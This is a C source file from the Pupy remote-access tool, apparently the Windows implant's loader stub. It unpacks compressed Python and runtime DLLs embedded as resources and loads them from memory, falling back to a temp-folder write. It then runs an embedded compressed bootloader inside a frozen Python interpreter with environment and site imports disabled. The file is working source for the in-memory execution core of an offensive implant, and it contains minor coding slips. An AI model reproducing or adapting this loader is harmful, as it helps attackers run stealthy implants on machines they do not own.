/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "pupy_load.h"
#include "Python-dynload.h"
#include "actctx.h"
#include "resource_python_manifest.c"
#include "base_inject.h"
#include "debug.h"

#include "resources_msvcr90_dll.c"
#include "resources_python27_dll.c"
#include "resources_bootloader_pyc.c"

#include "lzmaunpack.c"

#include "revision.h"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

CRITICAL_SECTION csInit; // protecting our init code

// Simple trick to get the current pupy arch
#ifdef _WIN64
	const DWORD dwPupyArch = PROCESS_ARCH_X64;
#else
	const DWORD dwPupyArch = PROCESS_ARCH_X86;
#endif


DWORD WINAPI mainThread(LPVOID lpArg)
{

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	char tmp_python_dll_path[MAX_PATH];
	char tmp_manifest_path[MAX_PATH];
	char tmp_path[MAX_PATH];
	ULONG_PTR cookie = 0;
	PyGILState_STATE restore_state;

	dfprint(stderr, "TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

	if(!GetModuleHandle("msvcr90.dll")) {
		void *msvcr90 = lzmaunpack(
			resources_msvcr90_dll_start,
			resources_msvcr90_dll_size,
			NULL
		);

		int r = _load_msvcr90(msvcr90);
		free(msvcr90);

		dfprint(stderr,"loading msvcr90.dll: %d\n", r);
	}
	else{
		dfprint(stderr,"msvcr90.dll already loaded\n");
	}

	GetTempPath(MAX_PATH, tmp_path);
	//InitializeCriticalSection(&csInit);

	if(!Py_IsInitialized)
	{
		int res=0;
		if(GetModuleHandle("python27.dll")){
			HANDLE hp;
			dfprint(stderr,"python27.dll is already loaded\n");
			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
		}
		else{
			void *python27 = lzmaunpack(resources_python27_dll_start, resources_python27_dll_size, NULL);
			int res = _load_python("python27.dll", python27);
			free(python27);
			if(!res) {
				dfprint(stderr,"loading python27.dll from memory failed\n");

				//if loading from memory fail, we write dll on disk
				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);

				f=fopen(tmp_python_dll_path,"wb");
				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
				fclose(f);

				if(!_load_python(tmp_python_dll_path, NULL)){
					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
						dfprint(stderr,"could not load python dll\n");
					}
				}
			}
		dfprint(stderr,"python interpreter loaded\n");
		}
	}
	dfprint(stderr,"calling PyEval_InitThreads() ...\n");
	PyEval_InitThreads();
	dfprint(stderr,"PyEval_InitThreads() called\n");
	if(!Py_IsInitialized()){
		ppath = Py_GetPath();
		strcpy(ppath, "\x00");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1; /* remove site.py auto import */
		Py_Initialize();

		dfprint(stderr,"Py_Initialize()\n");
		PySys_SetObject("frozen", PyBool_FromLong(1));
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	dfprint(stderr,"init_memimporter()\n");
	initpupy();
	dfprint(stderr,"initpupy()\n");

	/* We execute then in the context of '__main__' */
	dfprint(stderr,"starting evaluating python code ...\n");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyObject_lzmaunpack(
		resources_bootloader_pyc_start,
		resources_bootloader_pyc_size
	);
	if (seq) {
		Py_ssize_t i, max = PySequence_Length(seq);
		for (i=0;i<max;i++) {
			PyObject *sub = PySequence_GetItem(seq, i);
			if (seq) {
				PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
				if (!discard) {
					PyErr_Print();
					rc = 255;
				}
				Py_XDECREF(discard);
				/* keep going even if we fail */
			}
			Py_XDECREF(sub);
		}
	}
	PyGILState_Release(restore_state);
	Py_Finalize();
	//DeleteCriticalSection(&csInit);

	return 0;
}
